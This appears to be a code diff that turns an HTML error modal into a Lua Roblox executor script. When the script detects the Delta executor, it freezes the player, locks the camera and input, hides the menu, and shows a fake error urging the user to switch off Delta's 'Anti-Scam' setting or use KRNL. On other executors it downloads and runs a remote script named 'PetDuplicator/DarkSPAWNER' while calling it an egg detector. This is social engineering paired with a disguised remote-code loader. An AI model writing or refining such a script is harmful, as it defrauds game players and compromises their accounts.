@@ -1,114 +1,166 @@
-<!DOCTYPE html>
-<html lang="en">
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Delta Executor Detection</title>
-    <!-- Tailwind CSS CDN -->
-    <script src="https://cdn.tailwindcss.com"></script>
-    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
-    <style>
-        body {
-            font-family: 'Inter', sans-serif;
-            overflow: hidden; /* Prevent scrolling */
-        }
-        .background-image {
-            /* Using a slightly more visually interesting placeholder that still fits the "game" theme */
-            background-image: url('https://placehold.co/1920x1080/2c3e50/ecf0f1?text=Game+Background');
-            background-size: cover;
-            background-position: center;
-            filter: blur(8px); /* Apply blur effect */
-            -webkit-filter: blur(8px); /* For Safari */
-            position: absolute;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            z-index: -1; /* Ensure it's behind the modal */
-        }
-    </style>
-</head>
-<body class="bg-gray-900 flex items-center justify-center h-screen">
-    <!-- Blurred Background Effect -->
-    <div class="background-image"></div>
+--[[
+    Delta Executor Detection + Freeze Lock by Nelli (Recreated in Lua for Roblox)
 
-    <!-- Main Modal Frame -->
-    <div class="relative bg-white p-6 rounded-lg shadow-xl max-w-sm w-full mx-4 sm:mx-0">
-        <!-- Close Button (X icon) -->
-        <button class="absolute top-3 right-3 text-gray-500 hover:text-gray-700 text-2xl font-bold">
-            &times;
-        </button>
+    This script aims to replicate the functionality and visual style of the
+    HTML UI for a Roblox environment. It detects if the script is running
+    on a "Delta" executor, and if so, applies a freeze effect and displays
+    a custom UI with a message and a copy button.
 
-        <!-- Title Section -->
-        <div class="flex items-center justify-center mb-4">
-            <h2 class="text-xl font-semibold text-gray-800">Error Message</h2>
-        </div>
+    Note: This is a client-side script (LocalScript) and should be placed
+    in StarterPlayerScripts or PlayerGui.
+]]
 
-        <!-- Message Content -->
-        <div class="text-center mb-6">
-            <p class="text-sm text-gray-700 mb-2">
-                Delta Executor detected.
-            </p>
-            <p class="text-xs text-gray-600 mb-4">
-                If you're seeing this message, it means your executor blocked this script because the executor doesn't support the script.
-            </p>
-            <p class="text-sm text-gray-700 font-medium mb-1">To fix this:</p>
-            <ul class="list-disc list-inside text-xs text-gray-600 space-y-1">
-                <li>Put your Anti-Scam setting off in Delta</li>
-                <li>Or use a compatible executor like KRNL instead!</li>
-            </ul>
-            <p class="text-xs text-gray-600 mt-4">
-                NatHub recommends KRNL for best results.
-            </p>
-        </div>
+local Players = game:GetService("Players")
+local Lighting = game:GetService("Lighting")
+local UserInputService = game:GetService("UserInputService")
+local StarterGui = game:GetService("StarterGui")
+local player = Players.LocalPlayer
+local camera = workspace.CurrentCamera
+local playerGui = player:WaitForChild("PlayerGui")
 
-        <!-- Copy KRNL Link Button -->
-        <div class="flex justify-center">
-            <button id="copyButton" class="bg-gray-300 hover:bg-gray-400 text-gray-800 font-bold py-2 px-6 rounded-md transition duration-300 ease-in-out shadow-md">
-                Copy KRNL Link
-            </button>
-        </div>
-    </div>
+-- Function to detect executor (based on original user-provided logic)
+local function getExecutorName()
+    if identifyexecutor then
+        return identifyexecutor()
+    elseif getexecutorname then
+        return getexecutorname()
+    elseif isdelta then
+        return "Delta"
+    elseif iskrnlclosure then
+        return "Krnl"
+    elseif syn then
+        return "Synapse X"
+    elseif is_sirhurt_closure then
+        return "SirHurt"
+    elseif pebc_execute then
+        return "ProtoSmasher"
+    elseif isfluxus then
+        return "Fluxus"
+    else
+        return "Unknown"
+    end
+end
 
-    <script>
-        document.getElementById('copyButton').addEventListener('click', function() {
-            const linkToCopy = "https://wearedevs.net/d/Krnl";
-            const button = this;
-            const originalText = "Copy KRNL Link";
-            const copiedText = "Copied!";
-            const failedText = "Failed to copy!";
+local executor = getExecutorName()
+warn("Executor Detected:", executor) -- Output to Roblox console
 
-            // Create a temporary textarea element
-            const tempInput = document.createElement('textarea');
-            tempInput.value = linkToCopy;
-            // Make it invisible and off-screen
-            tempInput.style.position = 'absolute';
-            tempInput.style.left = '-9999px';
-            tempInput.style.top = '-9999px';
-            document.body.appendChild(tempInput);
+-- If executor is Delta, activate the freeze screen
+if executor:lower():find("delta") then
+    -- Wait for character to load
+    local character = player.Character or player.CharacterAdded:Wait()
+    local humanoid = character:WaitForChild("Humanoid")
+    local rootPart = character:WaitForChild("HumanoidRootPart")
 
-            try {
-                tempInput.select(); // Select the text
-                const success = document.execCommand('copy'); // Execute copy command
+    -- 🌀 Blur screen (similar to HTML background blur)
+    local blur = Instance.new("BlurEffect")
+    blur.Name = "DeltaFreezeBlur"
+    blur.Size = 25 -- Adjust blur intensity as needed
+    blur.Parent = Lighting
 
-                if (success) {
-                    button.textContent = copiedText;
-                } else {
-                    button.textContent = failedText;
-                    console.error('Failed to copy text using execCommand.');
-                }
-            } catch (err) {
-                button.textContent = failedText;
-                console.error('Error copying text:', err);
-            } finally {
-                document.body.removeChild(tempInput); // Clean up the temporary element
+    -- 🧊 Freeze player
+    humanoid.WalkSpeed = 0
+    humanoid.JumpPower = 0
+    humanoid.AutoRotate = false
+    rootPart.Anchored = true
 
-                // Revert button text after a delay
-                setTimeout(() => {
-                    button.textContent = originalText;
-                }, 1500); // Increased delay slightly for better visibility
-            }
-        });
-    </script>
-</body>
-</html>
+    -- 🎥 Lock camera
+    -- Ensure the camera exists and is ready
+    if not camera then
+        camera = workspace:WaitForChild("CurrentCamera")
+    end
+    camera.CameraType = Enum.CameraType.Scriptable
+    -- Position camera relative to the player's root part
+    camera.CFrame = CFrame.new(rootPart.Position + Vector3.new(0, 6, 12), rootPart.Position)
+
+    -- Create UI (mimicking the HTML modal's appearance)
+    local screenGui = Instance.new("ScreenGui")
+    screenGui.Name = "DeltaDetectionUI"
+    screenGui.IgnoreGuiInset = true
+    screenGui.ResetOnSpawn = false -- Keep UI after player respawns
+    screenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
+    screenGui.Parent = playerGui
+
+    local mainFrame = Instance.new("Frame")
+    mainFrame.Size = UDim2.new(0, 400, 0, 200) -- Fixed size like in HTML
+    mainFrame.AnchorPoint = Vector2.new(0.5, 0.5)
+    mainFrame.Position = UDim2.new(0.5, 0, 0.5, 0)
+    mainFrame.BackgroundColor3 = Color3.fromRGB(255, 255, 255) -- White background
+    mainFrame.BorderSizePixel = 0
+    mainFrame.Parent = screenGui
+
+    local uiCorner = Instance.new("UICorner")
+    uiCorner.CornerRadius = UDim.new(0, 10) -- Rounded corners
+    uiCorner.Parent = mainFrame
+
+    local title = Instance.new("TextLabel")
+    title.Text = "Error Message" -- From HTML
+    title.Font = Enum.Font.Gotham -- Common Roblox font
+    title.TextSize = 18
+    title.TextColor3 = Color3.fromRGB(30, 30, 30)
+    title.BackgroundTransparency = 1
+    title.Size = UDim2.new(1, -40, 0, 30) -- Adjusted for single line
+    title.Position = UDim2.new(0, 20, 0, 10)
+    title.TextWrapped = true
+    title.TextXAlignment = Enum.TextXAlignment.Center
+    title.TextYAlignment = Enum.TextYAlignment.Center
+    title.Parent = mainFrame
+
+    local messageText = Instance.new("TextLabel")
+    messageText.Text = "Delta Executor detected.\n\nIf you're seeing this message, it means your executor blocked this script because the executor doesn't support the script.\n\nTo fix this:\n• Put your Anti-Scam setting off in Delta\n• Or use a compatible executor like KRNL instead!\n\nNatHub recommends KRNL for best results."
+    messageText.Font = Enum.Font.Gotham
+    messageText.TextSize = 12
+    messageText.TextColor3 = Color3.fromRGB(60, 60, 60)
+    messageText.BackgroundTransparency = 1
+    messageText.Size = UDim2.new(1, -40, 0, 100) -- Adjusted height for multi-line
+    messageText.Position = UDim2.new(0, 20, 0, 40) -- Position below title
+    messageText.TextWrapped = true
+    messageText.TextXAlignment = Enum.TextXAlignment.Center
+    messageText.TextYAlignment = Enum.TextYAlignment.Top -- Align to top for multi-line
+    messageText.Parent = mainFrame
+
+    -- Copy Button
+    local copyButton = Instance.new("TextButton")
+    copyButton.Size = UDim2.new(0, 200, 0, 36)
+    copyButton.Position = UDim2.new(0.5, -100, 1, -50) -- Position at the bottom
+    copyButton.BackgroundColor3 = Color3.fromRGB(180, 180, 180) -- Gray background
+    copyButton.Text = "Copy Krnl Link"
+    copyButton.Font = Enum.Font.Gotham
+    copyButton.TextSize = 16
+    copyButton.TextColor3 = Color3.fromRGB(0, 0, 0) -- Black text
+    copyButton.AutoButtonColor = true -- Roblox default button hover effect
+    copyButton.Parent = mainFrame
+
+    local buttonCorner = Instance.new("UICorner")
+    buttonCorner.CornerRadius = UDim.new(0, 6) -- Rounded corners for button
+    buttonCorner.Parent = copyButton
+
+    -- Copy functionality (using setclipboard for Roblox)
+    copyButton.MouseButton1Click:Connect(function()
+        pcall(function() -- Use pcall for clipboard operations as they can sometimes fail
+            setclipboard("https://wearedevs.net/d/Krnl")
+            copyButton.Text = "Copied!"
+            task.wait(1)
+            copyButton.Text = "Copy Krnl Link"
+        end)
+    end)
+
+    -- 🔧 Hide TopBar (ESC/menu)
+    pcall(function()
+        StarterGui:SetCore("TopbarEnabled", false)
+    end)
+
+    -- ⛔ Block input backup
+    UserInputService.InputBegan:Connect(function(input)
+        if input.UserInputType == Enum.UserInputType.Keyboard or input.UserInputType == Enum.UserInputType.Gamepad1 then
+            input:CaptureController()
+        end
+    end)
+else
+    -- ✅ Not Delta → continue loading Egg Detector script (from original user-provided logic)
+    -- This part assumes the 'loadstring' and 'game:HttpGet' functions are available in your Roblox executor.
+    -- In a standard Roblox game, you would use a ModuleScript or a pre-loaded script.
+    -- For demonstration, keeping the original structure.
+    pcall(function()
+        loadstring(game:HttpGet("https://raw.githubusercontent.com/GrowAGarden-updated/PetDuplicator/refs/heads/main/DarkSPAWNER"))()
+    end)
+end
